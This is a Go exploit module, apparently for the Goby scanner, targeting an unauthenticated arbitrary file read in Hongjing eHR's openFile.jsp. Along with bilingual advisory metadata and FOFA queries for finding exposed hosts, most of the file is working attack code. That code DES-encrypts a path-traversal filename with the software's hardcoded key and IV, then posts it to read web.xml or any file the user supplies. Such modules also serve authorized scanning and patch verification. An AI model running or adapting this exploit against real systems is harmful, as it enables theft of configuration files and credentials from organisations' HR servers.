package exploits

import (
	"crypto/cipher"
	"crypto/des"
	"encoding/base64"
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "Hongjing eHR /templates/attestation/../../general/muster/hmuster/openFile.jsp File Read Vulnerability",
    "Description": "<p>Hongjing eHR human resource management software is a kind of human resource management and digital application integration, to meet the dynamic, collaborative, process, strategic needs of the software.Hongjing eHR openFile.jsp interface has an arbitrary file read vulnerability.Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., resulting in an extremely insecure state of the website.</p>",
    "Product": "Hongjing",
    "Homepage": "http://www.hjsoft.com.cn/?title=%E9%A6%96%E9%A1%B5#/",
    "DisclosureDate": "2024-07-09",
    "PostTime": "2024-07-15",
    "Author": "1977250845@qq.com",
    "FofaQuery": "title=\"人力资源信息管理系统\" && body=\"/general/sys/hjaxmanage.js\"",
    "GobyQuery": "title=\"人力资源信息管理系统\" && body=\"/general/sys/hjaxmanage.js\"",
    "Level": "1",
    "Impact": "<p>Hong Jing eHR openFile.jsp interface has an arbitrary file read vulnerability.Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., resulting in an extremely insecure state of the website.</p>",
    "Recommendation": "<p>Disable Internet exposure or interface Settings. A security fix has been released for the software. Affected users can contact the vendor to obtain the patch.</p>",
    "References": [
        "https://blog.csdn.net/qq_41904294/article/details/139439378"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "web.xml,Customize",
            "show": ""
        },
        {
            "name": "Customize",
            "type": "input",
            "value": "../webapps/hrms/WEB-INF/web.xml",
            "show": "mode=Customize"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/templates/attestation/../../general/muster/hmuster/openFile.jsp",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "filename=8uHo1M8Ok6bZ468mKmzw70ounZHwKUWnpVOrvOAV6WoPAATTP3HJDPAATTP"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "xmlns",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.1",
    "Translation": {
        "CN": {
            "Name": "宏景eHR /templates/attestation/../../general/muster/hmuster/openFile.jsp 文件读取漏洞",
            "Product": "宏景eHR",
            "Description": "<p>宏景eHR人力资源管理软件是一款人力资源管理与数字化应用相融合，满足动态化、协同化、流程化、战略化需求的软件。宏景eHR openFile.jsp 接口处存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。<br></p>",
            "Recommendation": "<p>关闭互联网暴露面或接口设置访问权限。目前软件已发布安全修复更新，受影响用户可以联系厂商获取补丁。<br></p>",
            "Impact": "<p>宏景eHR openFile.jsp 接口处存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "Hongjing eHR /templates/attestation/../../general/muster/hmuster/openFile.jsp File Read Vulnerability",
            "Product": "Hongjing",
            "Description": "<p>Hongjing eHR human resource management software is a kind of human resource management and digital application integration, to meet the dynamic, collaborative, process, strategic needs of the software.Hongjing eHR openFile.jsp interface has an arbitrary file read vulnerability.Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., resulting in an extremely insecure state of the website.<br></p>",
            "Recommendation": "<p>Disable Internet exposure or interface Settings. A security fix has been released for the software. Affected users can contact the vendor to obtain the patch.<br></p>",
            "Impact": "<p>Hong Jing eHR openFile.jsp interface has an arbitrary file read vulnerability.Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., resulting in an extremely insecure state of the website.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10972"
}`
	//hrms加密
	hrmsEncryptNDSHIWBCB1837GUBDJBX := func(key string, plaintext []byte) string {
		// Create DES cipher
		block, err := des.NewCipher([]byte(key))
		if err != nil {
			return ""
		}

		// IV (Initialization Vector)
		iv := []byte{1, 2, 3, 4, 5, 6, 7, 8}

		// CBC mode
		mode := cipher.NewCBCEncrypter(block, iv)

		// PKCS5 Padding
		padding := des.BlockSize - len(plaintext)%des.BlockSize
		padtext := make([]byte, len(plaintext)+padding)
		copy(padtext, plaintext)
		for i := len(plaintext); i < len(padtext); i++ {
			padtext[i] = byte(padding)
		}

		// Encrypt
		ciphertext := make([]byte, len(padtext))
		mode.CryptBlocks(ciphertext, padtext)

		// Encode to base64
		encoded := base64.StdEncoding.EncodeToString(ciphertext)
		encoded = strings.ReplaceAll(encoded, "%", "@2HJ5@")
		encoded = strings.ReplaceAll(encoded, "+", "@2HJB@")
		encoded = strings.ReplaceAll(encoded, " ", "@2HJ0@")
		encoded = strings.ReplaceAll(encoded, "/", "@2HJF@")
		encoded = strings.ReplaceAll(encoded, "?", "@3HJF@")
		encoded = strings.ReplaceAll(encoded, "#", "@2HJ3@")
		encoded = strings.ReplaceAll(encoded, "&", "@2HJ6@")
		encoded = strings.ReplaceAll(encoded, "=", "@3HJD@")
		encoded = strings.ReplaceAll(encoded, "\r\n", "")
		encoded = strings.ReplaceAll(encoded, "\n", "")
		encoded = strings.ReplaceAll(encoded, "\r", "")
		encoded = strings.ReplaceAll(encoded, "@", "PAATTP")
		return encoded
	}
	setPayloadRequestQIJBASJBCISUIUWEUDFDFBBDN := func(hostInfo *httpclient.FixUrl, filePath string) (string, error) {
		requestResult := ""
		filePathEncrypt := hrmsEncryptNDSHIWBCB1837GUBDJBX("ilovethi", []byte(filePath))
		url := "/templates/attestation/../../general/muster/hmuster/openFile.jsp"
		makeRequest := httpclient.NewPostRequestConfig(url)
		makeRequest.VerifyTls = false
		makeRequest.Timeout = 10
		makeRequest.FollowRedirect = false
		makeRequest.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		makeRequest.Data = "filename=" + filePathEncrypt
		if resp, err := httpclient.DoHttpRequest(hostInfo, makeRequest); err == nil {
			requestResult = resp.RawBody

			return requestResult, nil
		} else {
			return requestResult, err
		}
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,

		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			runPayload := setPayloadRequestQIJBASJBCISUIUWEUDFDFBBDN
			vulURL := "/templates/attestation/../../general/muster/hmuster/openFile.jsp"
			defaultModeMap := map[string]string{
				"../webapps/hrms/WEB-INF/web.xml": "/WEB-INF",
			}

			for fileUrl, fileText := range defaultModeMap {
				resp, err := runPayload(hostInfo, fileUrl)
				if err != nil {
					continue
				}
				if strings.Contains(resp, fileText) {
					// 设置VULURL
					ss.VulURL = hostInfo.HostInfo + vulURL
					return true
				}

			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var fileUrl string
			var fileText string
			mode := goutils.B2S(ss.Params["mode"])

			// 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件
			defaultModeMap := map[string][2]string{
				"web.xml": {"../webapps/hrms/WEB-INF/web.xml", "/WEB-INF"},
			}
			// 此处需要修改：函数继承
			uploadFileFunc := setPayloadRequestQIJBASJBCISUIUWEUDFDFBBDN

			// 请注意，后续代码为模板固化，正常情况下均无需修改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			if mode == "Customize" {
				fileUrl = goutils.B2S(ss.Params["Customize"])
			} else {
				if _, ok := defaultModeMap[mode]; ok {
					fileUrl = defaultModeMap[mode][0]
					fileText = defaultModeMap[mode][1]
				} else {
					expResult.Success = false
					return expResult
				}
			}

			// 获取返回结果url和返回请求头
			resp, err := uploadFileFunc(expResult.HostInfo, fileUrl)
			if err != nil || (!strings.Contains(resp, fileText) && mode != "Customize") {
				expResult.Success = false
				return expResult
			}

			expResult.Success = true
			expResult.OutputType = "html"
			expResult.Output = resp
			return expResult
		},
	))
}
